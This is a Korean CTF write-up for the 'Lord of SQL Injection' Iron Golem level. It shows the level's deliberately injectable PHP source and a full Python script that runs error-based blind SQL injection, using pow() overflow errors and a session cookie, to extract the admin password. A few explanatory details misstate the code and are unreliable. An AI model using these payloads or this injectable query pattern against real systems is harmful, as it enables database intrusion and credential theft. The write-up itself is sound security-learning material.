# Lord of SQL Injection No.21 Iron Golem

LOS Iron Golem은 기본적인 Error Based SQL Injection 공격을 할 수 있도록 유도한 문제이다.

## 소스 코드
```php
<?php
  include "./config.php"; 
  login_chk(); 
  dbconnect(); 
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
  $query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(mysql_error()) exit(mysql_error());
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  
  $_GET[pw] = addslashes($_GET[pw]);
  $query = "select pw from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'";
  $result = @mysql_fetch_array(mysql_query($query));
  if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
  highlight_file(__FILE__);
?>
```

```php
if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
```

`$_GET` 방식으로 입력받은 `pw`값에 `prob`, `_`, `.`, `(`, `)` 가 포함되어 있으면 `No Hack ~_~`을 출력한 후 문제 풀이에 실패하게 된다.

```php
if(preg_match('/sleep|benchmark/i', $_GET[pw])) exit("HeHe");
```

`$_GET` 방식으로 입력받은 `pw`값에 `sleep`, `benchmark`가 포함되어 있으면 `No Hack ~_~`을 출력한 후 문제 풀이에 실패하게 된다.

sleep 함수와 benchmark 함수는 `time based sql injection`에 사용되는 함수이다.

```php
if(mysql_error()) exit(mysql_error());
```

처음보는 코드가 보인다.
코드를 살펴보면 "만약 MySQL DB에서 오류가 발생하면, 에러를 출력하고 종료한다" 라는 의미인데, 이번 문제는 이 구문을 통해서 **Error Based SQL Injection**으로 해결 가능한 문제임을 알 수 있다.

**Error Based SQL Injection**은 위와 같이 오류가 발생하면 예외적으로 특별한 행동을 수행하게 하는 코드가 있으면 이를 이용하여 고의적으로 오류를 발생시켜 원하는 값을 알아내거나 공격을 할 수 있게 하는 공격 방법이다.

```php
$query = "select id from prob_iron_golem where id='admin' and pw='{$_GET[pw]}'"
```

query문은 los 문제 초반 쯤에 나올만한 기본적인 query문이다.

#### 문제 풀이 조건

```php
if(($result['pw']) && ($result['pw'] == $_GET['pw'])) solve("iron_golem");
```

`$_GET` 방식으로 입력받은 `pw`값과 DB 내에 존재하는 `pw` 값이 일치하면 문제 풀이에 성공하게 된다.

## Solution

이 문제는 Error Based SQL Injection 을 이용한 Blind SQL Injection 이다.

```python
import urllib.request
from urllib.parse import quote

result = ""
pwlen = 0

for i in range(1, 30):
    url = "http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw="
    data = "' or id='admin' and if((length(pw)='{}'),power(2,99999999999),0) -- ;".format(str(i))
    print(data)
    data = quote(data)
    re = urllib.request.Request(url + data)
    re.add_header("User-agent", "Mozilla/5.0")
    re.add_header("Cookie", "PHPSESSID=breqgq9o0qrbiingkqc7v00c35")
    res = urllib.request.urlopen(re)

    if str(res.read()).find("DOUBLE value is out of range in") != -1:
        pwlen = i
        print("Password Length is {} !!".format(pwlen))
        break

for i in range(1, pwlen + 1):
    for j in range(32, 128):
        url = "http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw="
        data = "' or id='admin' and if((substr(pw,{},1)='{}'),power(2,99999999999),0) -- ;".format(str(i), chr(j))
        print(data)
        data = quote(data)
        re = urllib.request.Request(url + data)
        re.add_header("User-agent", "Mozilla/5.0")
        re.add_header("Cookie", "PHPSESSID=breqgq9o0qrbiingkqc7v00c35")
        res = urllib.request.urlopen(re)

        if str(res.read()).find("DOUBLE value is out of range in") != -1:
            result += chr(j).lower().replace(" ","")

            print("Found it! [{}]".format(result))
            break

print("Password is [{}]".format(result))
```

```python
data = "' or id='admin' and if((length(pw)='{}'),power(2,99999999999),0) -- ;".format(str(i))
```

Error Based SQL Injection을 위해 고의적으로 오류를 발생시킬 때 사용한 방법은 **지수 연산 오류**이다.

python 코드에서는 `power` 함수를 사용하여 거듭제곱 연산 오류를 발생시켰다.

power 함수는 첫번째 인자값에 두번째 인자값만큼 거듭제곱한 값을 반환해주는 함수이다.

예를 들어 power(2,3) 과 같이 코드에 존재하면 2³이 반환되는 것이다.

이를 통해서 `length(pw)`에 일치하는 값이 들어가면 이는 1을 반환하기 때문에 1+1이 되어 2^99999999999 라는 값을 반환하게 된다. 이 값은 연산 가능 범위를 초과하기 때문에 에러를 발생시키게 된다.

올바른 결과값을 발생시키면 발생하는 에러는
`DOUBLE value is out of range in 'pow(2,99999999999)'` 과 같기 때문에 소스를 읽어올 때 다음과 같은 문장을 찾게되면 `pwlen` 변수에 비밀번호 길이가 저장된다.

이를 통해 얻어낸 `pwlen`은 16이며 `pwlen`을 찾는 방법과 같이 substr 함수를 이용하여 지수 연산 오류를 발생시키면 `pw`값을 찾아낼 수 있다.
(pw에서 찾아진 공백은 `.replace`를 통해 치환했다.)

```
http://los.eagle-jump.org/iron_golem_d54668ae66cb6f43e92468775b1d1e38.php?pw=!!!!
```

URL에 `?pw=!!!!`을 추가하면 문제풀이에 성공하게 된다.